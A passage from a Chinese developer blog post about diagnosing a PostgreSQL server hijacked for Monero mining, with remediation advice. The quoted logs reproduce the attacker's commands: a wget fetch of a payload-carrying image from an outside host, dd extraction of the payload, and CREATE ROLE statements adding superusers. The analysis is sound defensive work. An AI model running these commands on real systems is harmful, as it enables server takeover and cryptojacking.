+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">erlang&#x590D;&#x5236;&#x4EE3;&#x7801; 23 Resolving img1.imagehousing.com (img1.imagehousing.com)... 104.27.180.36, 104.27.181.36, 2400:cb00:2048:1::681b:b524, ...</span><br><span class="line"> 24 Connecting to img1.imagehousing.com (img1.imagehousing.com)|104.27.180.36|:80... connected.</span><br><span class="line"> 25 HTTP request sent, awaiting response... 200 OK</span><br><span class="line"> 26 Length: 1571 (1.5K) [image/png]</span><br><span class="line"> 27 Saving to: &#x2018;./conf1.dat&#x2019;</span><br><span class="line"> 28</span><br><span class="line"> 29      0K .                                                     100%  368M=0s</span><br><span class="line"> 30</span><br><span class="line"> 31 2018-08-05 12:54:26 (368 MB/s) - &#x2018;./conf1.dat&#x2019; saved [1571/1571]</span><br><span class="line"> 32</span><br><span class="line"> 33 896+0 records in</span><br><span class="line"> 34 896+0 records out</span><br><span class="line"> 35 896 bytes copied, 0.000933778 s, 960 kB/s</span><br><span class="line"> 36 chmod: cannot access &apos;./x4064410502&apos;: No such file or directory</span><br><span class="line"> 37 2018-08-05 12:54:26 CST [24806-14] pgsql@postgres LOG:  duration: 810.107 ms  statement: select fun6404402637 (&apos;wget  -c  http://img1.imagehousing.com/0/baby-942650.png -O ./conf1.dat;dd  skip=675  bs=1  if=./conf1.dat  of=config.json  ;rm -f ./conf1#</span><br><span class="line"> 38 --2018-08-05 12:54:27--  http://img1.imagehousing.com/0/cat-497532.png</span><br><span class="line"> 39 Resolving img1.imagehousing.com (img1.imagehousing.com)... 104.27.180.36, 104.27.181.36, 2400:cb00:2048:1::681b:b424, ...</span><br><span class="line"> 40 Connecting to img1.imagehousing.com (img1.imagehousing.com)|104.27.180.36|:80... connected.</span><br><span class="line"> 41 HTTP request sent, awaiting response... 200 OK</span><br><span class="line"> 42 Length: 840464 (821K) [image/png]</span><br><span class="line"> 43 Saving to: &#x2018;ifzsvasg.jpg&#x2019;</span><br><span class="line"> 44</span><br><span class="line"> 45      0K .......... .......... .......... .......... ..........  6% 81.3K 9s</span><br><span class="line"> 46     50K .......... .......... .......... .......... .......... 12%  153K 7s</span><br><span class="line"> 47    100K .......... .......... .......... .......... .......... 18% 86.2K 7s</span><br><span class="line"> 48    150K .......... .......... .......... .......... .......... 24%  635K 5s</span><br><span class="line"> 49    200K .......... .......... .......... .......... .......... 30%  138K 4s</span><br><span class="line"> 50    250K .......... .......... .......... .......... .......... 36%  139K 4s</span><br><span class="line"> 51    300K .......... .......... .......... .......... .......... 42%  146K 4s</span><br><span class="line"> 52    350K .......... .......... .......... .......... .......... 48%  176K 3s</span><br><span class="line"> 53    400K .......... .......... .......... .......... .......... 54%  194K 3s</span><br><span class="line"> 54    450K .......... .......... .......... .......... .......... 60%  189K 2s</span><br><span class="line"> 55    500K .......... .......... .......... .......... .......... 67%  179K 2s</span><br><span class="line"> 56    550K .......... .......... .......... .......... .......... 73%  178K 1s</span><br><span class="line"> 57    600K .......... .......... .......... .......... .......... 79%  187K 1s</span><br><span class="line"> 58    650K .......... .......... .......... .......... .......... 85%  191K 1s</span><br><span class="line"> 59    700K .......... .......... .......... .......... .......... 91%  132K 0s</span><br><span class="line"> 60    750K .......... .......... .......... .......... .......... 97%  202K 0s</span><br><span class="line"> 61    800K .......... ..........                                 100%  141K=5.3s</span><br><span class="line"> 62</span><br><span class="line"> 63 2018-08-05 12:54:33 (154 KB/s) - &#x2018;ifzsvasg.jpg&#x2019; saved [840464/840464]</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>
+
+<p>&#x770B;&#x8D77;&#x6765;&#x901A;&#x8FC7; postgre &#x7AEF;&#x53E3;&#x6267;&#x884C;&#x4E86;&#x8FDC;&#x7A0B;&#x4E0B;&#x8F7D;&#x6307;&#x4EE4;&#x3002;&#x4E0D;&#x7981;&#x5F88;&#x597D;&#x5947;&#x662F;&#x600E;&#x4E48;&#x505A;&#x5230;&#x7684;&#xFF0C;&#x4F46;&#x662F;&#x53C8;&#x4E0D;&#x6562;&#x628A;&#x8FD9;&#x4E24;&#x5F20;&#x56FE;&#x7247;&#x76F4;&#x63A5; scp &#x5230;&#x672C;&#x5730;&#xFF0C;&#x4E8E;&#x662F;&#x8D77;&#x4E86;&#x4E2A;&#x9759;&#x6001;&#x6587;&#x4EF6; serve &#x770B;&#x4E86;&#x4E0B;&#x8FD9;&#x4E24;&#x5F20;&#x56FE;&#x7247;&#x8868;&#x9762;&#x4E0A;&#x770B;&#x8D77;&#x6765;&#x7ADF;&#x7136;&#x662F;&#x65AF;&#x5609;&#x4E3D;&#x7EA6;&#x7FF0;&#x900A;&#x7684;&#x7167;&#x7247;&#xFF01;</p>
+<p><img src="https://gitee.com/songjianzaina/juejin_p5/raw/master/img/f9f4375bde3230c0c9ce2658a24c5410e2af525889fae99f40de2e1a2643aebb" alt="Scarlett Johansson"></p>
+<p><strong>&#x90A3;&#x4E48;&#x4E3A;&#x5565;&#x8981;&#x4E0B;&#x8FD9;&#x5F20;&#x56FE;&#x7247;&#x5462;&#xFF0C;&#x53C8;&#x662F;&#x600E;&#x4E48;&#x901A;&#x8FC7;&#x8FD9;&#x5F20;&#x56FE;&#x7247;&#x5230;&#x6211;&#x7684;&#x670D;&#x52A1;&#x5668;&#x4E2D;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x7684;&#x5462;&#xFF1F;</strong></p>
+<p>&#x5370;&#x8C61;&#x91CC;&#x9762; jpg/jpeg &#x56FE;&#x7247;&#x4F3C;&#x4E4E;&#x6709;&#x79CD;&#x9690;&#x5199; payload &#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x65E9;&#x5E74;&#x95F4;&#x4F5C;&#x4E3A;&#x846B;&#x82A6;&#x5A03;&#x79CD;&#x5B50;&#x6765;&#x4F20;&#x64AD;&#xFF0C;&#x7F51;&#x4E0A;&#x67E5;&#x5230; metaspolit &#x7684;&#x8FD9;&#x4E2A;<a href="/external_links/9305cd2fcd21c0542d6339f72b734b19.html" target="blank" rel="noopener">&#x7EC4;&#x4EF6;</a>&#x4F3C;&#x4E4E;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x3002;&#x540C;&#x65F6;&#x4E5F;&#x627E;&#x5230;&#x4E86;&#x8FD9;&#x4E2A;&#x5DE5;&#x5177; <a href="/external_links/87fe93878ac5c2985decfbf27c816a1a.html" target="blank" rel="noopener">strgdetext</a> &#x7528;&#x6765;&#x63D0;&#x53D6;&#x56FE;&#x7247;&#x4E2D;&#x7684;&#x9690;&#x5199;&#x6570;&#x636E;&#xFF0C;&#x53EF;&#x60DC;&#x63D0;&#x53D6;&#x51FA;&#x6765;&#x540E;&#x4ECD;&#x662F;&#x4E00;&#x6BB5;&#x770B;&#x4E0D;&#x61C2;&#x4E8C;&#x8FDB;&#x5236;&#x7801;&#xFF0C;&#x4E8E;&#x662F;&#x601D;&#x8DEF;&#x963B;&#x585E;&#x4F4F;&#x4E86;&#x3002;</p>
+<p>&#x60F3;&#x5230;&#x65E2;&#x7136;&#x9700;&#x8981;&#x63D0;&#x53D6; payload, &#x90A3;&#x4E48;&#x6570;&#x636E;&#x5E93;&#x65E5;&#x5FD7;&#x91CC;&#x80AF;&#x5B9A;&#x4E5F;&#x6709;&#x76F8;&#x5E94;&#x4EE3;&#x7801;&#x6765;&#x505A;&#x8FD9;&#x4E00;&#x6B65;&#xFF0C;&#x4E8E;&#x662F;&#x91CD;&#x65B0;&#x7FFB;&#x4E86;&#x4E0B;&#x65E5;&#x5FD7;&#xFF0C;&#x679C;&#x4E0D;&#x5176;&#x7136;&#xFF0C;&#x53D1;&#x73B0;&#x4E86;&#x771F;&#x6B63;&#x653B;&#x51FB;&#x7684;&#x8FD9;&#x4E00;&#x6B65;&#x5728;&#x8FD9;&#x513F;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">less&#x590D;&#x5236;&#x4EE3;&#x7801; 68 2018-08-05 12:54:34 CST [24806-15] pgsql@postgres LOG:  duration: 6705.657 ms  statement: select fun6404402637(&apos;wget  -c   http://img1.imagehousing.com/0/cat-497532.png -O ifzsvasg.jpg;dd  skip=20656  bs=1  if=./ifzsvasg.jpg  of=x4064410502;rm -f ./i#</span><br><span class="line"> 69 2018-08-05 12:54:34 CST [24845-1] postgres@postgres FATAL:  password authentication failed for user &quot;postgres&quot;</span><br><span class="line"> 70 2018-08-05 12:54:34 CST [24845-2] postgres@postgres DETAIL:  Connection matched pg_hba.conf line 101: &quot;host    all             all              0.0.0.0/0              md5&quot;</span><br><span class="line"> 71 2018-08-05 12:54:35 CST [24806-16] pgsql@postgres ERROR:  role &quot;login&quot; already exists</span><br><span class="line"> 72 2018-08-05 12:54:35 CST [24806-17] pgsql@postgres STATEMENT:  CREATE ROLE   LOGIN ENCRYPTED PASSWORD &apos;md51351dbb7fe95c1f277282bc842cb3d6b&apos; SUPERUSER CREATEDB CREATEROLE REPLICATION   VALID UNTIL &apos;infinity&apos;;</span><br><span class="line"> 73 2018-08-05 12:54:36 CST [24806-18] pgsql@postgres ERROR:  role &quot;login&quot; already exists</span><br><span class="line"> 74 2018-08-05 12:54:36 CST [24806-19] pgsql@postgres STATEMENT:  CREATE ROLE   LOGIN ENCRYPTED PASSWORD &apos;md51351dbb7fe95c1f277282bc842cb3d6b&apos; SUPERUSER CREATEDB CREATEROLE    VALID UNTIL &apos;infinity&apos;;</span><br><span class="line"> 75 2018-08-05 12:54:36 CST [24806-21] pgsql@postgres STATEMENT:  CREATE ROLE pgsql LOGIN ENCRYPTED PASSWORD &apos;md56413b16b3d0861a1d2538e8d5a5eb39c&apos;  SUPERUSER CREATEDB CREATEROLE    VALID UNTIL &apos;infinity&apos;;</span><br></pre></td></tr></table></figure>
+
+<p>&#x6211;&#x4EEC;&#x7B80;&#x5355;&#x5206;&#x6790;&#x4E0B;&#x8FD9;&#x6BB5;&#x65E5;&#x5FD7;&#xFF0C;</p>
+<p>&#x770B;&#x5230;&#x5176;&#x901A;&#x8FC7; <code>select tmp_function(cmd)</code>  &#x7684;&#x65B9;&#x5F0F; &#x6267;&#x884C;&#x4E86;&#x4EE5;&#x4E0B;&#x64CD;&#x4F5C;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rust&#x590D;&#x5236;&#x4EE3;&#x7801;&#x4E0B;&#x8F7D;&#x56FE;&#x7247; --&gt; &#x63D0;&#x53D6; paylod --&gt; &#x8BBE;&#x7F6E;&#x6743;&#x9650; --&gt; &#x5220;&#x9664;&#x56FE;&#x7247; --&gt; &#x901A;&#x8FC7; payload &#x91CC;&#x7684;&#x81EA;&#x5B9A;&#x4E49;&#x4EE3;&#x7801;&#x91CD;&#x5EFA;&#x4E86; pgsql &#x6570;&#x636E;&#x5E93;&#x8D26;&#x6237; --&gt; &#x62FF;&#x5230;&#x6570;&#x636E;&#x5E93; root &#x6743;&#x9650;</span><br></pre></td></tr></table></figure>
+
+<p>&#x6700;&#x7EC8;&#x6253;&#x4E86;&#x8FD9;&#x4E00;&#x5957;&#x7EC4;&#x5408;&#x62F3;&#xFF0C;&#x6F02;&#x4EAE;&#xFF01;</p>
+<p>&#x6392;&#x67E5;&#x5230;&#x95EE;&#x9898;&#x4E4B;&#x540E;&#xFF0C;&#x8D76;&#x7D27;&#x6E05;&#x7A7A;&#x4E86;&#x76F8;&#x5173;&#x6587;&#x4EF6;&#x548C; dbuser&#xFF0C;&#x8BBE;&#x7F6E;&#x4E86; postgres superuser &#x4EC5;&#x80FD;&#x901A;&#x8FC7;&#x672C;&#x5730;&#x8FDE;&#x63A5;&#x7684;&#x8BBE;&#x7F6E;&#xFF0C;&#x7981;&#x6389;&#x4E86; superuser &#x7F51;&#x7EDC;&#x8FDE;&#x63A5;, &#x81F3;&#x6B64; postgre &#x7528;&#x6237;&#x5C31;&#x4E0D;&#x518D;&#x80FD;&#x901A;&#x8FC7;&#x8FDC;&#x7A0B;&#x8BBF;&#x95EE;&#x6765;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x4E86;, &#x63A5;&#x7740;&#x518D;&#x786E;&#x8BA4;&#x4E0B;&#x670D;&#x52A1;&#x5668;&#x5176;&#x4ED6;&#x8FDB;&#x7A0B;, &#x53D1;&#x73B0;&#x6CA1;&#x6709;&#x5F02;&#x5E38;, &#x7EC8;&#x4E8E;&#x957F;&#x8212;&#x4E00;&#x53E3;&#x6C14;&#x3002;</p>
+<p>&#x56DE;&#x60F3;&#x8D77;&#x6765;&#xFF0C;&#x770B;&#x770B;&#x662F;&#x5426;&#x6709;&#x5176;&#x4ED6;&#x4EBA;&#x4E5F;&#x9047;&#x5230;&#x4E86;&#x300C;&#x65AF;&#x5609;&#x4E3D;&#x653B;&#x51FB;&#x300D;, &#x4E00;&#x67E5;&#x53D1;&#x73B0;&#x679C;&#x7136;&#x4E0D;&#x53EA;&#x6211;&#x4E00;&#x4EBA;&#x4E2D;&#x62DB;&#xFF0C;&#x4E0D;&#x8FC7;&#x770B;&#x4E86;&#x4E0B; <a href="/external_links/253046c04ed0622efabcec270e3a906a.html" target="blank" rel="noopener">exploit db</a> &#x91CC;&#x8FD8;&#x6CA1;&#x8BB0;&#x5F55;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#xFF0C;&#x5BF9;&#x6BD4;&#x4E86;&#x4E0B;&#x65F6;&#x95F4;&#xFF0C;&#x4F3C;&#x4E4E;&#x662F;18&#x5E74;&#x521D;&#x624D;&#x5174;&#x8D77;&#x7684;&#x3002;</p>
+<ul>
+<li><a href="/external_links/4c44b66e928f5314ae03bffb55447b36.html" target="blank" rel="noopener">&#x901A;&#x8FC7;Scarlett Johansson&#x7684;&#x7167;&#x7247;&#x4EE4;Postgre&#x6570;&#x636E;&#x5E93;&#x5F00;&#x542F;&#x95E8;&#x7F57;&#x5E01;&#x6316;&#x77FF;&#x4E4B;&#x65C5;</a></li>
+<li><a href="/external_links/fc82d076bdbd6dd22eeadb580a4c490a.html" target="blank" rel="noopener">&#x65AF;&#x5609;&#x4E3D;&#x95E8;&#x7F57;&#x5E01;&#x653B;&#x51FB;</a></li>
+</ul>
+<p>&#x8FD9;&#x4E0B;&#x5C31;&#x5F04;&#x660E;&#x767D;&#x4E86;, &#x4E4B;&#x524D;&#x5EFA;&#x7684;&#x957F;&#x8FDE;&#x63A5;&#x539F;&#x6765;&#x662F;&#x5728;&#x6316;&#x77FF;, &#x81EA;&#x5DF1;&#x4E5F;&#x4E2D;&#x62DB;&#x88AB;&#x5F53;&#x6210;&#x77FF;&#x673A;&#x4E86;&#x3002;</p>
+<h3 id="&#x53CD;&#x601D;"><a href="#&#x53CD;&#x601D;" class="headerlink" title="&#x53CD;&#x601D;"></a>&#x53CD;&#x601D;</h3><p>&#x8FD9;&#x6B21;&#x4E3B;&#x8981;&#x7684;&#x539F;&#x56E0;&#x662F; postgres &#x914D;&#x7F6E;&#x6743;&#x9650;&#x65F6;&#x5077;&#x61D2;&#x5BFC;&#x81F4;&#x670D;&#x52A1;&#x5668;&#x53D8;&#x6210;&#x6316;&#x77FF;&#x50F5;&#x5C38;&#x3002;</p>
+<ol>
+<li>postgres <code>pg_hba.conf</code> &#x91CC;&#x7684;&#x7528;&#x6237;&#x8BA4;&#x8BC1; method &#x5E94;&#x6539;&#x6210; md5 &#x65B9;&#x5F0F;</li>
+<li>&#x6570;&#x636E;&#x5E93; superuser &#x53EA;&#x914D;&#x7F6E;&#x53EA;&#x80FD; local &#x8BBF;&#x95EE;&#x7981;&#x6B62;&#x8FDC;&#x7A0B;&#x8BBF;&#x95EE;</li>
+<li>&#x817E;&#x8BAF;&#x4E91;&#x5B89;&#x5168;&#x7EC4;&#x91CC;&#x6570;&#x636E;&#x5E93;&#x7AEF;&#x53E3; outbound &#x5E94;&#x5C3D;&#x91CF;&#x9650;&#x5236; ip &#x6BB5;</li>
+</ol>
+<p><strong>&#x672C;&#x6587;&#x8F6C;&#x8F7D;&#x81EA;:</strong> <a href="/external_links/c140c0c649c2552b4e127c44861061d1.html" target="blank" rel="noopener">&#x6398;&#x91D1;</a></p>
+<p><em><a href="https://dev.newban.cn/">&#x5F00;&#x53D1;&#x8005;&#x535A;&#x5BA2; &#x2013; &#x548C;&#x5F00;&#x53D1;&#x76F8;&#x5173;&#x7684; &#x8FD9;&#x91CC;&#x5168;&#x90FD;&#x6709;</a></em></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="tags/后端/" rel="tag"># 后端</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="7036282935246323725.html" rel="next" title="glibc前沿版本233下的堆任意地址申请 前言 前置知识">
+                <i class="fa fa-chevron-left"></i> glibc前沿版本233下的堆任意地址申请 前言 前置知识
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="7036284440116461581.html" rel="prev" title="记录一次 Redis 频繁重连的排查 背景 问题描述 问题定">
+                记录一次 Redis 频繁重连的排查 背景 问题描述 问题定 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    <!-- 有瓣音频文章内嵌广告 -->
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-2626449904708114" data-ad-slot="6145016388"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+  <!-- 有瓣音频信息流广告 -->
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<ins class="adsbygoogle" style="display:block" data-ad-format="fluid" data-ad-layout-key="-6t+ed+2i-1n-4w" data-ad-client="ca-pub-2626449904708114" data-ad-slot="6455528644"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">开发者博客</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="https://dev.newban.cn/archives/">
+              
+                  <span class="site-state-item-count">2975</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">1162</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#背景"><span class="nav-number">1.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#排查"><span class="nav-number">2.</span> <span class="nav-text">排查</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反思"><span class="nav-number">3.</span> <span class="nav-text">反思</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">开发者博客</span>
+  <div>
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+  </div>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+  <script type="text/javascript" async src="js/src/mermaid.min.js"></script>
+  <script>
+  if (window.mermaid) {
+        var mermaid_config = {
+            startOnLoad: true,
+            theme: 'default',
+            flowchart:{
+                useMaxWidth: false,
+                htmlLabels: true
+            }                
+        }
+        mermaid.initialize(mermaid_config);
+  }
+  </script>
+  
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
